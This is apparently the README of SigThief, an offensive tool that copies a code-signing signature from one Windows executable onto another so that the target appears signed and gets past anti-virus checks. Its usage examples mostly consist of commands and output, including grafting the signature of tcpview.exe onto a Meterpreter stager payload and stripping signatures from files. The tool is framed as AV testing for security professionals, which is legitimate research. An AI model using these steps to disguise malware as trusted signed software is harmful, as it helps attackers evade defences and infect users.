# SigThief

Donate BTC: 16GfwSnSA7s5BtBfsPBdU59H4F6veq5uqk

Donate ETH: 0x7cCeC48F9F1470d663d4862784a03bee2d91834A 

---
Stealing Signatures and Making One Invalid Signature at a Time (Unless you read this:
https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf) 这PDF介绍了，如何将无效证书变为有效。

https://twitter.com/subTee/status/912769644473098240
![alt text](https://i.imgur.com/T05kwwn.png "https://twitter.com/subTee/status/912769644473098240")

## For security professionals only...

## What is this?

I've noticed during testing against Anti-Virus over the years that each is different and each prioritize PE signatures differently, whether the signature is valid or not. There are some Anti-Virus vendors that give priority to certain certificate authorities without checking that the signature is actually valid, and there are those that just check to see that the certTable is populated with some value. It's a mess.

So I'm releasing this tool to let you quickly do your testing and feel free to report it to vendors or not. 

In short it will rip a signature off a signed PE file and append it to another one, fixing up the certificate table to sign the file. 

Of course it's **not a valid signature** and that's the point!

I look forward to hearing about your results!


## How to use

### Usage
```
Usage: sigthief.py [options]

Options:
  -h, --help            show this help message and exit
  -i FILE, --file=FILE  input file
  -r, --rip             rip signature off inputfile
  -a, --add             add signautre to targetfile
  -o OUTPUTFILE, --output=OUTPUTFILE
                        output file
  -s SIGFILE, --sig=SIGFILE
                        binary signature from disk
  -t TARGETFILE, --target=TARGETFILE
                        file to append signature too
  -c, --checksig        file to check if signed; does not verify signature
  -T, --truncate        truncate signature (i.e. remove sig)
```

### Take a Signature from a binary and add it to another binary 复制程序A的证书到程序B

```
$ ./sigthief.py -i tcpview.exe -t x86_meterpreter_stager.exe -o /tmp/msftesting_tcpview.exe 
Output file: /tmp/msftesting_tcpview.exe
Signature appended. 
FIN.
```

### Save Signature to disk for use later 保存证书信息到硬盘
```
$ ./sigthief.py -i tcpview.exe -r                                                        
Ripping signature to file!
Output file: tcpview.exe_sig
Signature ripped. 
FIN.

```

### Use the ripped signature 使用保存的证书
```
$ ./sigthief.py -s tcpview.exe_sig -t x86_meterpreter_stager.exe                               
Output file: x86_meterpreter_stager.exe_signed
Signature appended. 
FIN.

```

### Truncate (remove) signature 移除证书信息
This has really interesting results actually, can help you find AVs that value Signatures over functionality of code. Unsign putty.exe ;)

```
$ ./sigthief.py -i tcpview.exe -T    
Inputfile is signed!
Output file: tcpview.exe_nosig
Overwriting certificate table pointer and truncating binary
Signature removed. 
FIN.
```

### Check if there is a signature (does not check validity) 检测是否有证书,不检测有效性
```
$ ./sigthief.py -i tcpview.exe -c
Inputfile is signed!
```
